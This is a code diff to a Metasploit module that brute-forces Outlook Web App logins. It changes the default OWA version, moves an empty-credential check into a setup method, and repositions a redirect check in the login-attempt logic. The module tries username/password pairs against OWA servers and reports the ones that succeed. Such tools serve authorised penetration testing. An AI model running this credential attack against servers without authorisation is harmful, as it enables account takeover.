@@ -18,8 +18,7 @@ class Metasploit3 < Msf::Auxiliary
     super(
       'Name'           => 'Outlook Web App (OWA) Brute Force Utility',
       'Description'    => %q{
-        This module tests credentials on OWA 2003, 2007, 2010, 2013 servers. The default
-        action is set to OWA 2010.
+        This module tests credentials on OWA 2003, 2007, 2010, and 2013 servers.
       },
       'Author'         =>
         [
@@ -70,7 +69,7 @@ class Metasploit3 < Msf::Auxiliary
             }
           ]
         ],
-      'DefaultAction' => 'OWA_2010',
+      'DefaultAction' => 'OWA_2013',
       'DefaultOptions' => {
         'SSL' => true
       }
@@ -93,12 +92,7 @@ class Metasploit3 < Msf::Auxiliary
     deregister_options('BLANK_PASSWORDS', 'RHOSTS','PASSWORD','USERNAME')
   end
 
-  def run
-
-    vhost = datastore['VHOST'] || datastore['RHOST']
-
-    print_status("#{msg} Testing version #{action.name}")
-
+  def setup
     # Here's a weird hack to check if each_user_pass is empty or not
     # apparently you cannot do each_user_pass.empty? or even inspect() it
     isempty = true
@@ -106,7 +100,13 @@ class Metasploit3 < Msf::Auxiliary
       isempty = false
       break
     end
-    print_error("No username/password specified") if isempty
+    raise ArgumentError, "No username/password specified" if isempty
+  end
+
+  def run
+    vhost = datastore['VHOST'] || datastore['RHOST']
+
+    print_status("#{msg} Testing version #{action.name}")
 
     auth_path   = action.opts['AuthPath']
     inbox_path  = action.opts['InboxPath']
@@ -247,6 +247,11 @@ class Metasploit3 < Msf::Auxiliary
       return :abort
     end
 
+    if res.redirect?
+      vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}' (response was a #{res.code} redirect)")
+      return :skip_pass
+    end
+
     if res.body =~ login_check
       print_good("#{msg} SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")
 
@@ -261,12 +266,6 @@ class Metasploit3 < Msf::Auxiliary
 
       report_auth_info(report_hash)
       return :next_user
-
-    if res.redirect?
-      vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}' (response was a #{res.code} redirect)")
-      return :skip_pass
-    end
-
     else
       vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}' (response body did not match)")
       return :skip_pass
